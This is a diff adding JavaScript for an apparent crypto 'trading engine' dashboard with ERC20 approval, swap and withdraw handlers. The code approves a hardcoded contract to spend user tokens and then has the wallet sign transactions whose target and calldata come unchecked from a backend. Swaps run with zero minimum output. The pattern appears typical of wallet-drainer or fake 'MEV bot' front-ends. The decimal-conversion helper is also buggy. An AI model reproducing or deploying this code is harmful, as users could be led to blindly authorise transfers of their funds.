@@ -1,1 +1,213 @@
+logToPanel("pancake_prod.txt loaded successfully. Case-Insensitive Router Matrix Active.");
+
+// ========================================================
+// 📱 GLOBAL CORE LOGGING CONFIGURATION
+// ========================================================
+function logToPanel(msg) {
+  const panel = document.getElementById("logPanel");
+  if (panel) {
+    panel.innerText += "\n" + msg;
+    panel.scrollTop = panel.scrollHeight;
+  } else {
+    console.log(msg);
+  }
+}
+window.logToPanel = logToPanel;
+
+// Helper to sanitize human text numbers into 18-decimal strings (Wei)
+function ensure18Decimals(amountInput) {
+    if (!amountInput) return "0";
+    const str = amountInput.toString().trim();
+    if (str === "0" || str === "") return "0";
+    if (str.length > 12) return str;
+    
+    if (!str.includes('.')) {
+        return str + "000000000000000000";
+    }
+    
+    const parts = str.split('.');
+    const whole = parts[0];
+    let fraction = parts[1];
+    
+    if (fraction.length < 18) {
+        fraction = fraction.padEnd(18, '0');
+    } else if (fraction.length > 18) {
+        fraction = fraction.substring(0, 18);
+    }
+    
+    const combined = (whole + fraction).replace(/^0+/, '');
+    return combined === "" ? "0" : combined;
+}
+
+// ========================================================
+// 🔏 ERC20 TOKEN ACCESS APPROVAL ENGINE
+// ========================================================
+async function requestTokenSpendApproval(userAddr, amountWei, tokenIn, spenderContract) {
+    try {
+        const cleanUser = userAddr.toLowerCase().trim();
+        const cleanToken = tokenIn.toLowerCase().trim();
+        const cleanSpender = spenderContract.toLowerCase().trim();
+
+        const approveMethodId = "0x095ea7b3";
+        const paddedSpender = cleanSpender.replace("0x", "").padStart(64, "0");
+        const paddedAmount = BigInt(amountWei).toString(16).padStart(64, "0");
+        const compiledApprovalData = approveMethodId + paddedSpender + paddedAmount;
+
+        logToPanel(`[APPROVAL] Requesting spend authorization for contract allowance...`);
+        const txHash = await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: cleanUser,
+                to: cleanToken,
+                data: compiledApprovalData,
+                value: "0x0"
+            }]
+        });
+
+        logToPanel(`⏳ Spend authorization broadcasted. Hash: ${txHash}`);
+        await new Promise(resolve => setTimeout(resolve, 6000)); // Wait for inclusion block
+        return { status: "ok", tx_hash: txHash };
+    } catch (err) {
+        logToPanel(`❌ Token spend approval rejected or failed: ${err.message || err}`);
+        throw err;
+    }
+}
+window.requestTokenSpendApproval = requestTokenSpendApproval;
+
+// ========================================================
+// 🎛️ OPERATIONAL INTERFACE DASHBOARD LISTENERS
+// ========================================================
+function setupActionListeners() {
+  // Dynamic Capital Processing Router Pipeline
+  document.getElementById("withdrawBtn")?.addEventListener("click", async () => {
+    if (!window.USER_ADDR) return logToPanel("❌ Connect wallet first.");
+    const inputAmount = document.getElementById("withdrawAmount").value;
+    if (!inputAmount || parseFloat(inputAmount) <= 0) return logToPanel("❌ Specify a valid amount.");
+
+    const amountWei = ensure18Decimals(inputAmount);
+    logToPanel(`🔄 Packaging withdrawal data parameters for: ${amountWei} Wei...`);
+
+    try {
+      const res = await fetch(`${window.API_BASE}/prodbot/withdraw`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: "0x55d398326f99059fF775485246999027B3197955", amount: amountWei })
+      });
+      const data = await res.json();
+      if (data && data.status === "ok") {
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{ from: window.USER_ADDR, to: "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B", data: data.withdraw_call, value: '0x0' }],
+        });
+        logToPanel(`✅ Withdrawal Sent! Hash: ${txHash}`);
+      }
+    } catch (err) {
+      logToPanel("❌ Withdrawal Action Interrupted: " + err.message);
+    }
+  });
+}
+
+// Auto-bind action listeners when script mounts onto DOM environment
+window.addEventListener("DOMContentLoaded", () => {
+    setupActionListeners();
+});
+
+// ========================================================
+// 🥞 SWAP TRANSACTION EXECUTORS (BSC & ETH VECTORS)
+// ========================================================
+async function runbscSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
+    try {
+        const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B"; 
+        const cleanUser = userAddr.toLowerCase().trim();
+        const cleanFrom = fromToken.toLowerCase().trim();
+        const cleanTo = toToken.toLowerCase().trim();
+        const cleanRouter = targetRouter.toLowerCase().trim();
+        
+        await requestTokenSpendApproval(cleanUser, amountWei, cleanFrom, V12_ADDR);
+
+        logToPanel(`⏳ Compiling swap payload data from backend route...`);
+        const res = await fetch("/prodbot/swap/bscuniswap", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                router: cleanRouter,
+                tokenIn: cleanFrom,
+                tokenOut: cleanTo,
+                amountIn: BigInt(amountWei).toString(), 
+                amountOutMin: "0"
+            })
+        });
+        
+        const backendPayload = await res.json();
+        if (!backendPayload || backendPayload.status !== "ok") {
+            throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
+        }
+
+        logToPanel(`📢 [SWAP PROMPT] Confirming execution parameters with the V12 Trading Engine...`);
+        const swapTxHash = await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: cleanUser,
+                to: backendPayload.swap_packet.to_contract.toLowerCase().trim(), 
+                data: backendPayload.swap_packet.compiled_data, 
+                value: "0x0"
+            }]
+        });
+
+        logToPanel(`🎉 Trade Segment Dispatched! Hash: ${swapTxHash}`);
+        return { status: "ok", tx_hash: swapTxHash };
+    } catch (e) {
+        logToPanel(`❌ BSC Swap Segment Pipeline Interrupted: ${e.message || e}`);
+        return { status: "error", message: e.toString() };
+    }
+}
+window.runbscSwapUniswap = runbscSwapUniswap;
+
+async function runethSwapUniswap(userAddr, amountWei, fromToken, toToken, targetRouter) {
+    try {
+        const V12_ADDR = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B";
+        const cleanUser = userAddr.toLowerCase().trim();
+        const cleanFrom = fromToken.toLowerCase().trim();
+        const cleanTo = toToken.toLowerCase().trim();
+        const cleanRouter = targetRouter.toLowerCase().trim();
+        
+        await requestTokenSpendApproval(cleanUser, amountWei, cleanFrom, V12_ADDR);
+
+        logToPanel(`⏳ Compiling swap payload data from backend route...`);
+        const res = await fetch("/prodbot/swap/ethuniswap", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                router: cleanRouter,
+                tokenIn: cleanFrom,
+                tokenOut: cleanTo,
+                amountIn: BigInt(amountWei).toString(),
+                amountOutMin: "0"
+            })
+        });
+        
+        const backendPayload = await res.json();
+        if (!backendPayload || backendPayload.status !== "ok") {
+            throw new Error(backendPayload.message || "Failed to compile transaction payloads.");
+        }
+
+        logToPanel(`📢 [SWAP PROMPT] Confirming execution parameters with the V12 Trading Engine...`);
+        const swapTxHash = await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: cleanUser,
+                to: backendPayload.swap_packet.to_contract.toLowerCase().trim(), 
+                data: backendPayload.swap_packet.compiled_data, 
+                value: "0x0"
+            }]
+        });
+
+        logToPanel(`🎉 Trade Segment Dispatched! Hash: ${swapTxHash}`);
+        return { status: "ok", tx_hash: swapTxHash };
+    } catch (e) {
+        logToPanel(`❌ ETH Swap Segment Pipeline Interrupted: ${e.message || e}`);
+        return { status: "error", message: e.toString() };
+    }
+}
+window.runethSwapUniswap = runethSwapUniswap;
 
